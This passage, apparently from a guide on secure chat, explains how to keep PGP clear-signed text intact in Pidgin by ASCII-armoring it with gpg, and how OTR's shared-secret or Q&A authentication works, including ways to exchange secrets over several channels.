A problem arises that some clients will compose messages (e.g. Pidgin composes messages with html), which often breaks the integrity of clear-sign. An effective way to resolve it is to encode the clear-signed text into radix-64 form to which composing is not harmful, via running `gpg --store -a`, and restoring via `gpg -d`. This command compresses its input transparently by default, thus easier than the “traditional” way to compress and then base64.


### About authencation via Q&A and/or shared secret


The OTR plugin of Pidgin by default supports authencation via Q&A and/or shared secret (they are essentially the same). Its core thought is to get a secret only you two know between you and your opposite side, and then ask them a question about the shared secret via the Q&A and/or shared secret functionality of the OTR plugin. If the answer is identical to the preset one, the public key of your opposite side is marked as trustful automatically. Your opposite side cannot obtain your preset answer, and you cannot obtain the answer from your opposite side. [A specific algorithm](https://en.wikipedia.org/wiki/Socialist_millionaires) is used to judge whether two value is equal without leaking the value itself to any other entity including the opposite side.


The shared secret itself is symmetric, thus if you have a communication network with N people, you should maintain N pieces of shared secret. It is the major disadvantage of such way, thus is suggested to be used along with assymmetric methods based on fingerprints. For example, if you only use OTR on one machine only (so that you have only one OTR instance), the shared secret could help your friends to authenticate you in case you accidentally lose your private key of the instance. It is obvious that other authenticated OTR instances of yours could play the same role.


Multi-channel is core of such authencation method. A lot of commonly seen way is described here:


- Exchanging the secret in café, bar, or clubs. Meeting physically is a relatively safe way, but adversaries should also be considered within your threat model (for shared secret is symmetric). It is usual to exchange shared secret for OTR when attending PGP signing parties.
- Exchanging the secret via mails signed with PGP, two key points should be noticed: 1) You should verify whether the key of your opposite side are trusted by other third-parties. 2) You should confirm their PGP fingerprint (usually completed via meeting physically, too) This method is based on the security of PGP itself.
- It could be completed via telephone, SMS, or other instant messaging tools if the security need is low. In scenes with higher security level, anonymous network like onion routing network and/or chatting service authenticated with SSL/TLS/SSH running on a private network could be used.
- Furthermore, channels based on these methods above could be further split, and the shared secret could be combined from information exchanged via multiple different channels. It should be noted that information exchanged via a channel should be noted as little as possible in other different channels.


The shared secret could be update on demand, e.g. during meeting or inside an authenticated OTR channel:


```
"Hey pal, shall we append '777' on our last shared secret?"
```